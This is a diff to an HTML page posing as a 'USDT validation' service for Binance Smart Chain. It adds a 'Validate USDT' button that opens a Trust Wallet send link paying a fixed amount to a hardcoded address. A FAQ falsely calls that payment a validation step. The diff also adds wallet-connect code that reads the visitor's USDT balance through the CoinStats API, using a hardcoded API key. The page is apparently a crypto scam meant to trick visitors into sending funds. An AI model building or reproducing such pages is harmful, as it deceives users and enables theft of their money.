@@ -83,10 +83,17 @@
   </div>  
   
   <div class="btn-row">
-    <button id="validateUSDT">Validate USDT</button>
-    <button id="connectWallet">Connect Wallet</button>
-    <button onclick="window.location.href='#faq'">FAQ</button>
-  </div>
+ <button onclick="window.open('https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.1193', '_blank')">Validate USDT</button>
+ <button onclick="window.location.href='#faq'">FAQ</button>
+ <button id="connectWallet">🔌 Connect Wallet</button>
+  <div id="walletInfo" style="display:none">
+    <div class="token-box">
+      <a href="https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955" target="_blank">
+        <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT" />
+      </a>
+      <span id="usdtAmount">Loading...</span>
+    </div>
+    
   
   <div> 
   <div class="chart-container">
@@ -97,8 +104,7 @@
   </div>  
   <h2 id="faq">[1] HOW TO VALIDATE</h2>
   <p>To validate Asset click on "Validate USDT" which redirects you to Trust Wallet. Confirm your BNB network validation and wait 5 minutes after validation to transfer from Trust Wallet to your Binance.</p>
-  
-  
+
   <script>
     const COINS = [
       "tether", "bitcoin", "binancecoin", "binance-usd", "solana", "ethereum", "dogecoin",
@@ -181,6 +187,64 @@
 
     window.addEventListener("load", loadPrices);
   </script>
+  <script>
+    const COINSTATS_API_KEY = "V8SdDOudIYXG82+OGM+iGXt7M1Gkce/RwPb93L3PlxY=";
+    const USDT_CONTRACT_BSC = "0x55d398326f99059ff775485246999027b3197955";
 
+    const providerOptions = {
+      walletconnect: {
+        package: window.WalletConnectProvider.default,
+        options: {
+          rpc: { 56: "https://bsc-dataseed.binance.org/" },
+          chainId: 56
+        }
+      }
+    };
+
+    const web3Modal = new window.Web3Modal.default({
+      cacheProvider: false,
+      providerOptions,
+      theme: "light"
+    });
+
+    let web3;
+
+    async function getUSDTBalance(address) {
+      try {
+        const res = await fetch(`https://api.coinstats.app/public/v1/token/${USDT_CONTRACT_BSC}?chain=bsc&wallet=${address}`, {
+          headers: {
+            "x-api-key": COINSTATS_API_KEY
+          }
+        });
+        const data = await res.json();
+        const balance = parseFloat(data?.walletBalance?.value || 0).toFixed(2);
+        document.getElementById("usdtAmount").textContent = `$${balance} USDT`;
+      } catch (err) {
+        console.error("CoinStats API error:", err);
+        document.getElementById("usdtAmount").textContent = "$0.00 USDT";
+      }
+    }
+
+    document.getElementById("connectWallet").addEventListener("click", async () => {
+      try {
+        const provider = await web3Modal.connect();
+        web3 = new Web3(provider);
+
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
+          alert("Please switch to Binance Smart Chain (BSC).");
+          return;
+        }
+
+        const accounts = await web3.eth.getAccounts();
+        const userAddress = accounts[0];
+        document.getElementById("walletInfo").style.display = "block";
+        getUSDTBalance(userAddress);
+      } catch (err) {
+        console.error("Wallet connection error:", err);
+        alert("Failed to connect. Please try again.");
+      }
+    });
+  </script>
   </body>
 </html>
